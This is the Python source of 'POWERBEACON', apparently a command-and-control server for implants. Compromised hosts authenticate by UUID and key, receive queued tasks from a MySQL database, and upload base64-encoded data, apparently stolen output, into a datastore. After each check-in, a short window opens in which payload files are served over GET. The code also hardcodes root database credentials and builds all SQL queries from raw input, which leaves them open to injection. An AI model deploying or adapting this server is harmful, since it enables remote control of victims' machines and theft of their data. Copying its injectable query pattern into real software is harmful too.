#!/usr/bin/python3
import MySQLdb
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import ast
import time
import threading
import signal
import sys
import os
from datetime import datetime
import base64
import argparse
import ssl

should_get=False             #controls whether thge server is active
stop_threads=False           #stop the thread resetting should_get

#Configure database connection
#hostname = 'localhost'
#username = 'root'
#password = 't00r'
#database = 'powerbeacon'
#connection = MySQLdb.connect( host=hostname, user=username, passwd=password, db=database )



#####controls whether GET will be answered.  Is OFF except for 5 seconds after auth
def unset_should_get():
    global should_get
    global stop_threads
    while True:
        if stop_threads:
            break
        if should_get:
            time.sleep(5)
        should_get=False
        time.sleep(5)

class HandleRequests(BaseHTTPRequestHandler):
    def log_message(self,format, *args):
        pass

    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):   #Get Function
        purple="\033[35m"
        default="\033[39m"
        red="\033[31m"
        green="\33[32m"
        yellow="\33[33m"
        blue="\33[34m"

        path=os.getcwd()
        req = self.path
        self.path=path + "/web_serve/"+self.path  #path to serve from
        IP=self.client_address[0]
        try:
            global should_get
            if should_get:
                self._set_headers()
                with open(self.path, 'rb') as f:
                    data = f.read()  #read file
                    f.close()
                self.wfile.write(data)
                print(green+"[+]WEB_RESPONSE:::IP="+IP+":::File="+req+":::[200 OK]"+default)  #write to console that it was read
        except:
            with open(path+"/web_serve/404.html", 'rb') as f:  #otherwise return a 404
                data = f.read()
                f.close()
            self.wfile.write(data)
            print(yellow+"[!]WEB_RESPONSE:::IP="+IP+":::File="+req+":::[400 NOT FOUND]"+default)  #and log the 404 to console

    def do_POST(self):
        global should_get
        purple="\033[35m"
        default="\033[39m"
        red="\033[31m"
        green="\33[32m"
        yellow="\33[33m"
        blue="\33[34m"
        
        #dicto = {}
        #line_check = {}
        send_task = ''
        #reads post request body

        self._set_headers()
        try:
            #Read the contents and convert to a dictionay formate we can use
            content_len = int(self.headers['Content-Length'])
            post_body = self.rfile.read(content_len)
            post_body = post_body.decode("utf-8")
            new_obj = ast.literal_eval(post_body)
            IP=self.client_address[0]
        except:
            IP = self.client_address[0]
            date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
            print(yellow+date_time+"[*]Request from  IP: " + IP + " :::Malformed Request"+default)
            return 0

        #Pull vars from dict
        connection=MySQLdb.connect(host='127.0.0.1',user='root',password='t00r',database="powerbeacon")
        try:
            UUID=new_obj["UUID"]
            key=new_obj["key"]
            request=new_obj["event"]
        except:
            IP = self.client_address[0]
            date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
            print(yellow+date_time+"[*]Request from IP: " + IP + " :::Malformed Request"+default)
            return 0

        cursor=connection.cursor()
        #check if implant exists
        query = "select * from implants where UUID='" + UUID +"'"
        cursor.execute(query)
        results=cursor.fetchall()
        if (len(results)<1):  #if it doesn't exist write implant not found and return
            date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
            print(red+date_time+"[*]Request from " + UUID + " at IP: " + IP + " :::IMPLANT NOT FOUND"+default)
            connection.close()
            return 0
        #Check if key matches    
        query = "select * from implants where UUID='" + UUID +"' and implantkey='"+key+"'"
        cursor.execute(query)
        results=cursor.fetchall()
        if (len(results) > 0):
            if (request=="req"):#only if requests
#                cursor.execute("update checkins set last_checkin=now() where UUID='" + UUID +"'")
                cursor.execute("INSERT INTO checkins (UUID,gateway) VALUES ('" + UUID +"','" + IP + "')")
                cursor.execute("commit")
                should_get = True
                query = "select task from tasks where UUID='" + UUID +"' and is_complete = 0"  #check for tasks...we should only do this is it's a request.  fix this later
                cursor.execute(query)
                results=cursor.fetchall() ###results are the tasks from the DB
                
                if (len(results) > 0):#if tasks are greater than none
                    date_time=datetime.now().strftime("%d_%m_%Y_%H%M%S")
                    print(green+date_time+"[+]Incomming Request from " + UUID + " at IP: " + IP + " :::Tasks delivered"+default)
                    #prepare line to return
                    send_task=''
                    for result in results:
                        send_task=send_task+str(result[0])+";"  #concat all tasks with a ";" between
                    self.wfile.write(send_task.encode("utf-8"))
                    ##and update the tasks so they are marked complete in the DB
                    query = "update tasks set is_complete = 1 where UUID = '" + UUID + "'"
                    cursor.execute(query)
                    connection.commit()
                    connection.close()
                    return 0
                
                else: #if no tasks
                    date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                    print(date_time+"[-]Incomming Request from " + UUID + " at IP: " + IP + " :::No Tasking Available")
                    connection.close()
                    return 0  #end of if for requests
            elif (request=="send"): #post data to server
                try:
                    data=new_obj["data"]
                    details=new_obj["details"]
                    data=base64.b64decode(data).decode('UTF-16LE')

                    query="INSERT INTO datastore (UUID,data,details) VALUES ('" + UUID + "','" + data +"','" + details +"')"
                    cursor.execute(query)
                    query="commit"
                    cursor.execute(query)
                    date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                    print(purple+date_time+"[+]Incomming Data Stream from " + new_obj["UUID"] + " at IP: " + IP + " :::"+default)
                    connection.close()
                    return 0
                except:
                    date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                    print(yellow+date_time+"[*]Request from IP: " + IP + " :::Malformed Request"+default)
                    connection.close()
                    return 0
                    

            else: #request type is bad
                date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                print(yellow+date_time+"[*]Request from IP: " + IP + " :::Malformed Request"+default)
                connection.close()
                return 0
                

        else: ###if key doesnt match
            date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
            print(red+date_time+"[*]Request from " + UUID + " at IP: " + IP + " :::INVALID KEY"+default)
            connection.close()
            return 0
    def do_PUT(self):
        self.do_POST()

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument('-p', type=int, required=True)
    parser.add_argument('-b', type=str, required=False)
    parser.add_argument('--ssl',type=str, required=False)
    args = parser.parse_args()
    
    if args.b:
        host = args.b
    else:
        host = ''
    port = args.p
    
    reset=threading.Thread(target=unset_should_get, args=())
    reset.start()
    if args.ssl=="true":
        try:
            ssl_server=HTTPServer((host, port), HandleRequests)
            ssl_server.socket = ssl.wrap_socket (ssl_server.socket, keyfile="/tmp/key.pem",certfile="/tmp/cert.pem", server_side=True)  #wrap with ssl
            print("[+]Starting POWERBEACON Server using SSL on port "+ str(port))
            ssl_server.serve_forever()
        except KeyboardInterrupt:
            print("\n[*]Shutting down server")
            stop_threads=True
    else:
        try:
            print("[+]Starting POWERBEACON Server on port "+ str(port))
            HTTPServer((host, port),HandleRequests).serve_forever()
        except KeyboardInterrupt:
            print("\n[*]Shutting down server")
            stop_threads=True
    
